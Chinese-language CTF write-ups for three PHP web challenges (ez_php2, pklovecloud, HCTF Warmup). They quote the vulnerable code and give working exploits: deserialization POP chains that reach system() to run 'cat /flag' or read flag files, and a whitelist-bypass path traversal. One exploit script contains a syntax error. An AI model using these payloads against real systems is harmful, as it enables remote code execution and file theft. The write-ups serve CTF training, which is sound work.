# [FSCTF 2023]ez_php2

### 代码审计

```php
<?php
highlight_file(__file__);
Class Rd{
    public $ending;
    public $cl;

    public $poc;
    public function __destruct()
    {
        echo "All matters have concluded";
        die($this->ending);
    }
    public function __call($name, $arg)
    {
        foreach ($arg as $key =>$value)
        {

            if($arg[0]['POC']=="1111")
            {
                echo "1";
                $this->cl->var1 = "system";
            }
        }
    }
}


class Poc{
    public $payload;

    public $fun;

    public function __set($name, $value)
    {
        $this->payload = $name;
        $this->fun = $value;
    }

    function getflag($paylaod)
    {
        echo "Have you genuinely accomplished what you set out to do?";
        file_get_contents($paylaod);
    }
}

class Er{
    public $symbol;
    public $Flag;

    public function __construct()
    {
        $this->symbol = True;
    }

    public function __set($name, $value)
    {
        $value($this->Flag);
    }


}

class Ha{
    public $start;
    public $start1;
    public $start2;
    public function __construct()
    {
        echo $this->start1."__construct"."</br>";
    }

    public function __destruct()
    {
        if($this->start2==="11111") {
            $this->start1->Love($this->start);
            echo "You are Good!";
        }
    }
}


if(isset($_GET['Ha_rde_r']))
{
    unserialize($_GET['Ha_rde_r']);
} else{
    die("You are Silly goose!");
}
```

<font style="color:rgb(77, 77, 77);">这段代码主要定义了四个类（Rd、Poc、Er、Ha），并通过检查 $_GET 参数来决定是否进行反序列化操作。如果存在特定的 $_GET 参数，则尝试反序列化其值，否则输出 “You are Silly goose!”。</font>

### <font style="color:rgb(77, 77, 77);">构造pop链</font>
1. Ha类里拥有魔术方法__construct，可以锚定开始的点
2. 整个代码里有两种危险函数，一是system()，二是file_get_contents()。由于无法确定flag的位置，所以优先构造system()的pop链

### 解题
<font style="color:rgb(77, 77, 77);">触发Ha类里的__destruct方法后，给start2赋值"11111"，然后进入如下语句：</font>

```plain
$this->start1->Love($this->start);
```

<font style="color:rgb(77, 77, 77);">使得其触发__call方法，然后给start赋值[‘POC’=>‘1111’]</font>  
<font style="color:rgb(77, 77, 77);">进入if语句，然后通过其中的var1触发__set方法</font>  
<font style="color:rgb(77, 77, 77);">然后value就成为了system，修改$Flag就可以修改执行的命令了</font>

<font style="color:rgb(77, 77, 77);">所以可以构造脚本</font>

```php
$a=new Ha();
$a->start2='11111';
$a->start1=new Rd();
$a->start=['POC'=>'1111'];
$a->start1->cl=new Er();
$a->start1->cl->Flag='ls /';
echo serialize($a);
```

得到payload：

```php
O:2:"Ha":3:{s:5:"start";a:1:{s:3:"POC";s:4:"1111";}s:6:"start1";O:2:"Rd":3:{s:6:"ending";N;s:2:"cl";O:2:"Er":2:{s:6:"symbol";b:1;s:4:"Flag";s:9:"cat /flag";}s:3:"poc";N;}s:6:"start2";s:5:"11111";}
```

拿到flag：`<font style="color:rgb(0, 0, 0);">flag{Y0u_a2e_S0_G00d!!!!!}</font>`

----

# [第五空间 2021]pklovecloud

### 源码
```php
<?php  
include 'flag.php';
class pkshow 
{  
    function echo_name()     
    {          
        return "Pk very safe^.^";      
    }  
} 

class acp 
{   
    protected $cinder;  
    public $neutron;
    public $nova;
    function __construct() 
    {      
        $this->cinder = new pkshow;
    }  
    function __toString()      
    {          
        if (isset($this->cinder))  
            return $this->cinder->echo_name();      
    }  
}  

class ace
{    
    public $filename;     
    public $openstack;
    public $docker; 
    function echo_name()      
    {   
        $this->openstack = unserialize($this->docker);
        $this->openstack->neutron = $heat;
        if($this->openstack->neutron === $this->openstack->nova)
        {
        $file = "./{$this->filename}";
            if (file_get_contents($file))         
            {              
                return file_get_contents($file); 
            }  
            else 
            { 
                return "keystone lost~"; 
            }    
        }
    }  
}  

if (isset($_GET['pks']))  
{
    $logData = unserialize($_GET['pks']);
    echo $logData; 
} 
else 
{ 
    highlight_file(__file__); 
}
?>
```

从最后一步开始倒着分析，很容易得：

`Class ace ->   echo_name() ->Class acp -> __toString() ->Class acp -> __construct()`

这样得一条链

### 脚本
我们先想办法触发Class acp->__construct()，在这里我们只需要编写下面的POC即可实现触发：<font style="color:rgb(77, 77, 77);"> </font>

```php
<?php
class pkshow
{
    function echo_name()
    {
        return "Pk very safe^.^";
    }
}
class acp
{
    protected $cinder;
    public $neutron;
    public $nova;
    function __construct()
    {
        $this->cinder = new pkshow();
    }
 
}
class ace
{
    public $filename;
    public $openstack;
    public $docker;
}
 
//触发Class acp -> __construct()
$a = new acp();
echo serialize($a);
```

接下来我们只需要**修改Class acp里面的__construct()构造函数里面的内容为：$cinder = new ace**;即可控制程序调用Class ace中的echo name（）；

```php
<?php
class pkshow
{
    function echo_name()
    {
        return "Pk very safe^.^";
    }
}
class acp
{
    protected $cinder;
    public $neutron;
    public $nova;
    function __construct()
    {
        $this->cinder = new ace;
    }
 
}
class ace
{
 
    public $filename="flag.php";
    public $openstack;
    public $docker;
    function echo_name()
    {
        $this->openstack = unserialize($this->docker);
        $this->openstack->neutron = $heat;
        if($this->openstack->neutron === $this->openstack->nova)
        {
            $file = "./{$this->filename}";
            if (file_get_contents($file))
            {
                return file_get_contents($file);
            }
            else
            {
                return "keystone lost~";
            }
        }
    }
}
 
//触发Class acp -> __construct() 
$a = new acp();
 
$b = new ace();
$b->docker=null;
 
echo (serialize($a);
```

这样就可以拿到提示

![](https://cdn.nlark.com/yuque/0/2025/png/50070958/1737534978416-3fbfaf02-dd9b-43ca-8d24-5293b78e0218.png)

所以直接修改**$this->filename= nssctfasdasdflag**

然后，提示是错的，flag根本不在这，通过网上查找，falg在上一级目录

`NSSCTF{4881c053-873b-49a6-be95-4137c7d81bd8}`

----

# [HCTF 2018]Warmup

![](https://cdn.nlark.com/yuque/0/2025/png/50070958/1737448650696-fa2c68bc-e4fc-4587-9739-449d2ee09b17.png)

在源代码里找到提示，访问该文件拿到代码

### 代码审计
```php
<?php
  highlight_file(__FILE__);
class emmm
  {
    public static function checkFile(&$page)
    {
      $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
      if (! isset($page) || !is_string($page)) {
        echo "you can't see it";
        return false;
      }

      if (in_array($page, $whitelist)) {
        return true;
      }

      $_page = mb_substr(
        $page,
        0,
        mb_strpos($page . '?', '?')
      );
      if (in_array($_page, $whitelist)) {
        return true;
      }

      $_page = urldecode($page);
      $_page = mb_substr(
        $_page,
        0,
        mb_strpos($_page . '?', '?')
      );
      if (in_array($_page, $whitelist)) {
        return true;
      }
      echo "you can't see it";
      return false;
    }
  }

if (! empty($_REQUEST['file'])
    && is_string($_REQUEST['file'])
    && emmm::checkFile($_REQUEST['file'])
   ) {
  include $_REQUEST['file'];
  exit;
} else {
  echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
}  
?>
```

+ 存在include()函数，尝试直接包含`hint.php`，提示：`<font style="color:rgb(0, 0, 0);">flag not here, and flag in ffffllllaaaagggg</font>`
+ <font style="color:rgb(0, 0, 0);">代码存在两个过滤，1是</font>**<font style="color:rgb(0, 0, 0);">检查有没有数组$whitelist里面的值</font>**<font style="color:rgb(0, 0, 0);">，2</font>**<font style="color:rgb(0, 0, 0);">是截断 ? 前的内容</font>**

<font style="color:rgb(0, 0, 0);">据此可以通过相对路径来尝试读取ffffllllaaaag</font>

<font style="color:rgb(0, 0, 0);">payload：</font>`source.php?file=hint.php?../../../../../ffffllllaaaagggg`

拿到flag：`NSSCTF{cf192782-c907-4599-9025-890311518d4a}`
